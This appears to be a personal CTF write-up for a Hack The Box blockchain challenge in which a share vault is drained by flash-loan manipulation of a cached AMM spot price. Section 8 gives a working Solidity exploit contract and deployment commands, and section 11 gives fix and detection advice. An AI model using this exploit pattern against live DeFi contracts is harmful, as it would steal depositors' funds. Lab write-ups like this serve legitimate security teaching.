---
title: "HTB CA2026 — Caldrin's Day Away: A Stamped Oracle Over a Manipulable Spot Reserve"
platform: Hack The Box
event: "Cyber Apocalypse CTF 2026: The Salt Crown"
challenge: Caldrin's Day Away
app: "Lower Quay Sharehouse — Solidity share vault behind a constant-product AMM and a single-call flash lender"
category: blockchain
difficulty: easy
points: 975
type: writeup
status: complete
mitre:
  - T1190
  - T1565.001
tags:
  - writeup
  - HTB
  - Security
  - Blockchain
  - oracle-manipulation
  - flash-loan
  - code-review
related:
  - "[[HTB-CA2026-Hollow-Courier-XFF-Hop-Count-Trust-Boundary]]"
aliases:
  - Caldrin's Day Away
  - CA2026 Caldrin's Day Away
created: 2026-07-26T03:30:48.939Z
updated: 2026-07-26T03:30:48.939Z
---

# Caldrin's Day Away — A Stamped Oracle Over a Manipulable Spot Reserve

> [!success] Solved — 2026-07-25 20:49
> Flag: `HTB{inquir3y_0ne_c4ldr1n_s0lv3d_4d144d84b7bf8bae5f9896db0c90f6c4}`
> **One transaction, 383,015 gas.** Sharehouse drained `1,000,000 → 109,009.900991` CROWN against a `150,000` threshold; `900,990.098919` CROWN to the operator.
> First **blockchain** solve. `easy` · 975 points. Winning tx `blockTimestamp` `0x6a655980` = `2026-07-26T00:49:04Z`, so the platform clock reads UTC−4.

> [!info] Scenario, verbatim
> On a random morning, Caldrin Vowmark leaves his chapel desk to escape royal seals, buy bread, and enjoy a quiet walk through the market. But the quay is already restless. Sailors argue over claim-marks, merchants blame bad luck, and a smiling broker named Verrin Goldhand moves through the crowd, calming people with soft words about patience and fortune. Caldrin follows the noise to a small dockside Sharehouse, where sailors leave coin, salt, and trade goods before long voyages. In return, they receive claim-marks they can exchange when they return. Lately, a few visitors have arrived with modest bundles and come back soon after to collect far more than expected. The keepers call it luck from the sea, but Caldrin notices the same pale wax on every suspicious claim. Before he leaves, he finds one of those pale-waxed marks has been sent onward to a larger Sharehouse in the old quarter.

## 0. How the flag was obtained

1. Unzipped seven Solidity files. **Read `Setup.sol` first** — `isSolved()` is `crownCoin.balanceOf(sharehouse) < 150_000e6` against a starting `1_000_000e6`. The whole room reduces to extracting more than `850_000e6`.
2. Read `DocksideSharehouse.redeemClaim`. Payouts are priced off `recordedHoldings`, a **stored cache**, not `balanceOf(this)`.
3. Read `recountHoldings`. Permissionless, and it writes that cache from whatever `PublicStampDesk` approves.
4. Read the desk and the market together. The approved order is hash-locked so nothing can be substituted — **but the one approved order resolves to `crownReserve` of a constant-product AMM** (§3).
5. **Grepped `activeBorrower` across the vault.** Present on `leaveGoods`; absent on `recountHoldings` and `redeemClaim`. That asymmetry is the finding — everything after is confirming and scoping it.
6. Checked sizing before writing code: clearing the threshold needs `crownReserve ≥ ~86.86M`, and `GOLDHAND_LIQUIDITY` is `90M`. Roughly 3.5% headroom — the intended path, confirmed.
7. Stood the **real** stack up locally (§6): Foundry, `anvil`, `Setup.sol` unmodified. Exploit ran end to end before the target was ever reachable — `isSolved()` `false → true`, 380,286 gas.
8. Spent roughly two thirds of the session obtaining an RPC URL (§7), then deployed against the live instance and called `run()` **once**. `isSolved()` → `true`; `/api/flag` returned the flag on the first call.

## 1. Shape of the challenge

Artifact-first with a live target: seven contracts shipped up front, connection details issued per-instance on a 30-minute lifetime by a TCP1P blockchain launcher.

```
caldrins-day-away/
|-- Setup.sol              # deploys the world, isSolved(), one-shot travel purse
|-- TradeToken.sol         # 6-decimal ERC20 (CROWN, SALT)
|-- DocksideMarket.sol     # constant-product AMM + valueCargoAsOneGood()
|-- DocksideSharehouse.sol # share vault: leaveGoods / redeemClaim / recountHoldings
|-- GoldhandCredit.sol     # single-call flash lender, 90,000,000e6 CROWN
|-- PublicStampDesk.sol    # hash-locked allowlist of permitted oracle reads
`-- IQuayBorrower.sol      # onQuayLoan callback
```

| Opening state | Value |
|---|---|
| Sharehouse CROWN / `recordedHoldings` | 1,000,000e6 / 1,000,000e6 |
| `totalClaimMarks` | 990,000e18, all seeded to one sailor |
| Market reserves | 1,000,000e6 CROWN / 1,000,000e6 SALT |
| Lender liquidity | 90,000,000e6 CROWN |
| Travel purse | 10,000e6 + matching credit, **one-shot** |
| Win threshold | sharehouse CROWN < 150,000e6 |

**The structural difference from the two secure-coding rooms: there is nothing to patch and nothing to bypass.** Withered Registry turned on a missing ownership check and Hollow Courier on a header a caller could choose. Here every call in the exploit is permitted, made by an entitled address, with arguments inside every stated bound. The defect is **ordering** — a cache refreshed at a moment the protocol never meant to be a valid pricing moment.

**The brief was technical, and accurate.** Per the event roll-up's second generalisation — believe the brief when it is technical, discount it when it is atmospheric — every element of the mechanism is in the scenario text. *"Modest bundles and come back soon after to collect far more than expected"* is deposit-then-redeem inside one visit; "soon after" is the flash-loan window. *"The same pale wax on every suspicious claim"* is the stamp: genuine on every fraudulent redemption. *"The keepers call it luck from the sea"* is the vault's own accounting showing nothing wrong, because it trusts its cache. *"A larger Sharehouse in the old quarter"* is the lender, named for the broker in the same sentence.

## 2. The vulnerability

Two facts, neither wrong alone. The bug lives in their composition — the same shape as Hollow Courier's `trusted_proxies` / `x_for=2` pair, moved from configuration into control flow.

| Fact | Where | Effect |
|---|---|---|
| Redemptions price off `recordedHoldings` | `DocksideSharehouse.redeemClaim` | `(claimMarkAmount * recordedHoldings) / totalClaimMarks`. A **cache**, never `balanceOf(this)` |
| `recountHoldings` is permissionless and unguarded | `DocksideSharehouse` | Any caller may refresh that cache at any instant, including mid-transaction |

**The guard coverage is the tell:**

| Function | `activeBorrower() == address(0)`? |
|---|---|
| `leaveGoods` | ✅ |
| `recountHoldings` | ❌ |
| `redeemClaim` | ❌ |

Flash loans **were** considered here. The guard exists, it is correct, and it is on exactly one entry point. Minting shares during a loan was foreseen; **repricing existing shares during a loan was not.**

Same pattern as Withered Registry, one layer down. There, sibling read routes scoped by ownership and the privileged write did not — a check present everywhere it did not matter and absent where it did. Here, a loan guard sits on the deposit path and not on the two functions that set and consume the price.

## 3. Why the stamp desk is not a control

`PublicStampDesk` is the "pale wax", and it is a well-built control aimed at the wrong property.

```solidity
require(stampDesk.isApproved(stampedOrder), "UNSTAMPED_ORDER");
(address target, bytes memory callData) = abi.decode(stampedOrder, (address, bytes));
```

The desk stores `keccak256` of the full `abi.encode(target, callData)`, so the target cannot be redirected and the arguments cannot be changed — ABI-decode leniency over trailing bytes buys nothing, because a distinct byte string hashes differently. **Substitution is genuinely closed.**

What the one approved order actually asks:

```solidity
valueCargoAsOneGood(SHAREHOUSE_CARGO_POSITION, 0)
  == (1_000_000e6 * crownReserve) / 1_000_000e6
  == crownReserve
```

An instantaneous constant-product reserve, used as the vault's authoritative holdings figure. Any trader can move it; any trader can then ask the vault to re-read it.

**The desk authenticates *which question is asked*. It says nothing about when, or whether the answer moved one instruction earlier in the same transaction.** Every fraudulent claim carries a valid seal — which is precisely what Caldrin observes on the quay.

This is Hollow Courier's `trusted_proxies` again in a different register: a directive that *classifies* rather than *asserts*. There the perimeter decided whose forwarding metadata to believe and believed everyone; here the desk decides which reads are permitted and permits one whose value is free.

## 4. The exploit, confirmed on-chain

Deposit at the honest price outside the loan, because `leaveGoods` is the one guarded path. Inflate, re-read and redeem inside it, because the other two are not.

| Step | Effect |
|---|---|
| `takeTravelPurse()` | +10,000e6 CROWN and matching credit |
| `leaveGoods(10_000e6)` | `10_000e6 × 990_000e18 ÷ 1_000_000e6` = **9,900e18 marks**; `totalClaimMarks` → 999,900e18 |
| borrow 90,000,000e6 | the full lender balance |
| `trade(CROWN→SALT, 90,000,000e6)` | `crownReserve` → **91,000,000e6**, 989,010e6 SALT out |
| `recountHoldings(order)` | `recordedHoldings` → **91,000,000e6** |
| `redeemClaim(9_900e18)` | `9_900e18 × 91,000,000e6 ÷ 999,900e18` = **900,990.099009e6 CROWN** |
| `trade(SALT→CROWN, 989,010e6)` | 89,999,910e6 back |
| repay | 89,999,910 + 900,990 = 90,900,900 ≥ 90,000,000 ✓ |

Event data from tx `0xd772cd8bff0cc1c873afd8434bc0077fc688b1232d4d09a378e3f0e5fa7c6624`:

| Event | Raw | Decoded |
|---|---|---|
| `GoodsLeft` marks | `0x218ae196b8d4f300000` | 9,900e18 |
| `HoldingsRecounted` from | `0xeb28b0f400` | 1,010,000e6 |
| `HoldingsRecounted` to | `0x52c396acb000` | **91,000,000e6** |
| `ClaimRedeemed` payout | `0xd1c731de41` | 900,990.099009e6 |

**`HoldingsRecounted: 1,010,000 → 91,000,000` is the whole vulnerability in one log line** — a 90× revaluation inside a single transaction, on the authority of a correctly-stamped read.

## 5. Falsified leads

Three hypotheses were eliminated with work that exists nowhere else.

**Redirecting the stamped order.** `PublicStampDesk` stores `keccak256` of the full `abi.encode(target, callData)`, so neither the target address nor the arguments can be changed. ABI-decode leniency over trailing bytes buys nothing — a distinct byte string hashes differently and fails the `require`. **The oracle target genuinely cannot be redirected.** This is the part of the control that works, and it is why the attack had to move the answer rather than the question.

**First-depositor share inflation.** The classic empty-vault attack — deposit 1 wei, donate directly to the vault, mint shares against a distorted ratio — needs `totalSupply == 0`. `totalClaimMarks` is pre-seeded at 990,000e18 against 1,000,000e6 of holdings, so there is no empty-vault edge and no exploitable rounding on the first deposit. **The vault is pre-seeded; the standard opening does not apply.**

**Depositing inside the loan.** The intuitive version of this attack is borrow → inflate → deposit cheap → redeem. It is blocked by `require(goldhandCredit.activeBorrower() == address(0))` on `leaveGoods` — the one guard in the contract that does its job. Eliminating it is what forced the deposit-first ordering, and finding the guard *present* on one path is what made its absence on the other two legible. **The working guard was the signpost to the missing ones.**

## 6. Local verification

The instance runs 30 minutes and `takeTravelPurse()` is one-shot, so a failed first attempt is expensive in a way neither secure-coding room was. Everything was proven before the target was reachable.

Foundry and `solc 0.8.24` both came from **GitHub releases** — the usual installer hosts are outside the sandbox allowlist, but `github.com` and `release-assets.githubusercontent.com` are not, so `solc` was pinned in `foundry.toml` rather than fetched by Forge. `Setup.sol` was deployed unmodified to `anvil` and the exploit run against it: `isSolved()` `false → true`, sharehouse `1,000,000 → 109,009.900991`, 380,286 gas.

The standalone exploit was then compiled with bare `solc` in an empty directory and deployed via `cast send --create`, proving it needs no project context. Local 380,286 gas versus on-chain 383,015 is the operator's Forge selecting 0.8.35 against the sandbox's 0.8.24 — not a behavioural difference.

Same principle as Hollow Courier's differential harness: point a verified rig at the artifact and let the numbers move, rather than asserting the arithmetic is right.

## 7. Instance provisioning — where the time actually went

The exploit was finished and verified before an RPC URL existed. **Roughly two thirds of the session went to provisioning, none of it to analysis.**

| Symptom | Reality |
|---|---|
| Every credential field renders `-` in page source | `app.js` fills them at runtime; view-source shows the template |
| Page shows key `0xac09…ff80` and `127.0.0.1:48334` | `staticPreviewInstance` fallback, rendered at init and on every fetch failure. **Any RPC on `127.0.0.1` is the dummy.** |
| `GET /api/get-current-instance` returns launcher HTML | It is a **POST** endpoint; the GET fell to a Next.js catch-all |
| `{ORIGIN}/<uuid>` used literally → nginx `405` | `app.js:193` — `value.replace("{ORIGIN}", origin + "/api")` |
| `POST /api/kill` says no instance exists, while `get-current-instance` returns one | A **stale record for a dead chain**. The RPC replied `-32602 Invalid instance ID`. |
| No launch endpoint in `app.js` | The themed page assumes an instance exists. `POST /api/launch` provisions and appears nowhere in that file. |

```
POST /api/launch                 -> provision, returns credentials
POST /api/get-current-instance   -> current credentials (POST, not GET)
POST /api/kill                   -> terminate
GET  /api/flag                   -> {success, flag}; 500 until isSolved()
RPC  <origin>/api/<instance-uuid>
```

Four rounds went into brute-forcing `/connection_info`-style endpoint names. One `grep -n ORIGIN` over `app.js` produced the answer. **Read the client rather than guessing at the server** — the same lesson the WEB rooms logged as *open the console and read all source early*.

## 8. Final payload

```solidity
function run() external {
    setup.takeTravelPurse();                        // must be the CONTRACT, not the EOA
    crown.approve(address(sharehouse), setup.TRAVEL_PURSE());
    myMarks = sharehouse.leaveGoods(setup.TRAVEL_PURSE());   // honest price, outside the loan
    credit.borrowForOneCall(crown.balanceOf(address(credit)), "");
    crown.transfer(owner, crown.balanceOf(address(this)));
}

function onQuayLoan(uint256 amount, bytes calldata) external {
    require(msg.sender == address(credit), "NOT_CREDIT");
    crown.approve(address(market), amount);
    uint256 saltOut = market.trade(int128(0), int128(1), amount, 0);   // pump crownReserve
    sharehouse.recountHoldings(setup.buildPublicRecountOrder());       // ungated re-read
    sharehouse.redeemClaim(myMarks);                                   // inflated payout
    salt.approve(address(market), saltOut);
    market.trade(int128(1), int128(0), saltOut, 0);                    // unwind
    require(crown.transfer(address(credit), amount), "REPAY_FAILED");
}
```

Full source: `blockchain/Exploit.sol`. Self-contained — inline interfaces, no imports, no project required.

```bash
curl -s -X POST http://[IP]:[PORT]/api/launch | jq

cd /absolute/path/to/blockchain
export RPC=http://[IP]:[PORT]/api/<instance-uuid>
export PK=0x<privkey from the launch response>
export SETUP=<setup contract addr>

cast chain-id --rpc-url $RPC                          # 31337
cast call $SETUP 'isSolved()(bool)' --rpc-url $RPC     # false

forge create Exploit.sol:Exploit --rpc-url $RPC --private-key $PK \
  --broadcast --constructor-args $SETUP
export EXPLOIT=<Deployed to: address>

cast send $EXPLOIT 'run()' --rpc-url $RPC --private-key $PK
cast call $SETUP 'isSolved()(bool)' --rpc-url $RPC     # true
curl -s http://[IP]:[PORT]/api/flag | jq
```

The API omits the `0x` on the private key; `cast` requires it. **Never call `takeTravelPurse()` from the wallet** — it is one-shot and the credit is per-address, so an EOA that takes it leaves the exploit contract unable to deposit and the instance dead.

## 9. Tools & techniques

`forge` 1.7.1 / 1.0.0 · `cast` · `anvil` · `solc` 0.8.24 and 0.8.35 · `curl` · `jq` · Foundry and solc pinned from GitHub releases.

Concepts: flash-loan price-oracle manipulation · constant-product AMM spot reserves as a price source · cached-state versus live-balance accounting in share vaults · guard-coverage asymmetry across a contract's entry points · allowlisting oracle *requests* versus authenticating oracle *values* · ordering attacks that use no reentrancy · provisioning against undocumented CTF infrastructure.

## 10. MITRE ATT&CK

- **T1190** Exploit Public-Facing Application — the vault's externally callable interface is the entire attack surface; no credential or access-control bypass was required
- **T1565.001** Stored Data Manipulation — `recordedHoldings` is data at rest inside the contract, manipulated to change the outcome of a subsequent legitimate operation

> [!warning] Honest scope of this mapping — verify the IDs before trusting them
> **Both IDs were assigned without access to the live ATT&CK matrix and are unverified.** T1190 is the weaker: nothing was "exploited" in the memory-safety sense — every call was permitted, from an entitled address, with in-bounds arguments. It is claimed only because the contract is the public interface and the effect was unauthorised value transfer.
>
> ATT&CK has **no coverage of smart-contract or DeFi mechanics**; there is no technique for *"the vault priced shares off a manipulable spot reserve."* **Cite the smart-contract taxonomies first for this class of room:** *Price Oracle Manipulation* in the OWASP Smart Contract Top 10 [Unverified — entry ID and year not checked against the live list], and DASP/SWC *Oracle Manipulation*. **CWE-345** Insufficient Verification of Data Authenticity is the precise weakness — the vault verifies the oracle *request* and never the *value* — with **CWE-841** Improper Enforcement of Behavioral Workflow for the partial guard.

## 11. Detection / blue-team & fix notes

- **Never price shares off a spot AMM reserve.** A constant-product reserve is a *quote*, not a *valuation*. Use a TWAP, a multi-source median, or — where the vault genuinely custodies the asset, as here — `balanceOf(this)`, which would have been both simpler and correct.
- **A cache in a pricing path is a question about who refreshes it and when.** Either compute holdings live inside `redeemClaim`, or make the refresh permissioned and lagged. Permissionless refresh over a caller-movable source is the entire bug.
- **Apply flash-loan guards across the whole state-changing surface or none of it.** A partial guard is worse than none, because it reads as considered and stops the reviewer looking further. Enumerate every function that mints, burns, or prices shares and confirm each carries the same guard — the audit is mechanical.
- **An allowlist over oracle requests is not integrity over oracle values.** When reviewing a control, ask what it actually *proves*. This one proves the question was pre-approved, which is not the property the vault needs. Structurally identical to Hollow Courier's `trusted_proxies`: classify-and-believe where assert-and-overwrite was required.
- **Detection.** Alert on any transaction in which a pool reserve moves by more than a set fraction *and* a dependent protocol re-reads its oracle within the same transaction. Both events are individually normal; the co-occurrence inside one transaction is the signature. Alarm on `HoldingsRecounted` deltas of an order of magnitude — a 90× move in one block has no legitimate cause.
- **Audit guards against each other, not against a style guide.** Every guard here passes review in isolation. The finding is the entry point missing the one its siblings carry — the same comparative read that found Withered Registry.

## 12. Method notes

- **Read the win condition before the protocol.** `isSolved()` reduced the room to one number, which is what made the 90M lender balance legible as a design constraint rather than background detail.
- **Sizing coincidences are design signals.** Needing ~86.86M against a 90M lender confirmed the intended path before a line of exploit code was written.
- **Verify locally, exhaustively, before a metered target.** A 30-minute clock plus a one-shot purse meant a blind first attempt could have ended the session. Fetching Foundry and solc from GitHub releases cost minutes and removed all of it.
- **Verifying an artifact is not shipping it.** A standalone exploit was written *and confirmed working*, then never actually handed over — the operator received the earlier import-based version and burned instance clock on unresolvable imports. **Confirm the artifact in the operator's hands is the one that was tested.**
- **Hand over command blocks with values already substituted.** `export VAR=<paste here>` pasted literally is a zsh redirect; two lines failed on `zsh: parse error near '\n'` for exactly this.
- **Read the client rather than guessing at the server.** Four rounds of endpoint brute-forcing against one `grep`.

## 13. Open items

- **`points: 975` is from the scenario page at solve time and drifts under dynamic scoring.** The sibling-copy failure already happened once in this tree — Hollow Courier carried 975 for a day against a real 950. Re-read from the platform before treating this field as authoritative.
- `solves` not captured from the event page. Omitted rather than guessed.
- Both ATT&CK IDs unverified — see §10. The smart-contract taxonomies are the defensible classification.
- Only reserve *inflation* was explored. Deflating `crownReserve` to collapse `recordedHoldings` — griefing other depositors rather than enriching the attacker — was never tested. Irrelevant to `isSolved()`, plausibly the more interesting primitive.
- The exploit contract has no withdrawal path beyond the `run()` sweep. Adequate for a 30-minute instance, a defect in anything reusable.
- *"A larger Sharehouse in the old quarter"* is read here as `GoldhandCredit`. Nothing in the seven shipped files supports a second vault; if a variant of this room has one, that reading is wrong.

## Cross-references
- [[HTB-CA2026-Hollow-Courier-XFF-Hop-Count-Trust-Boundary]]
- [[HTB-CA2026-Withered-Registry-Broken-Access-Control-Privileged-Write]]

## Change Log
- 2026-07-26 — Note created. Solved in a single transaction by flash-loan manipulation of a stamped constant-product spot reserve feeding a cached share price. Records the guard-coverage asymmetry as root cause (`leaveGoods` checks `activeBorrower()`; `recountHoldings` and `redeemClaim` do not, so shares can be repriced mid-loan even though they cannot be minted), why the hash-locked `PublicStampDesk` closes substitution but not manipulation, and the arithmetic verified twice — locally against unmodified `Setup.sol` on anvil, then against on-chain event data from the winning transaction. Includes the TCP1P launcher endpoint map, since roughly two thirds of session time went to provisioning rather than analysis. Points recorded as 975 from the scenario page and flagged as drift-prone in §12. Flag string operator-confirmed from `/api/flag` at solve time.
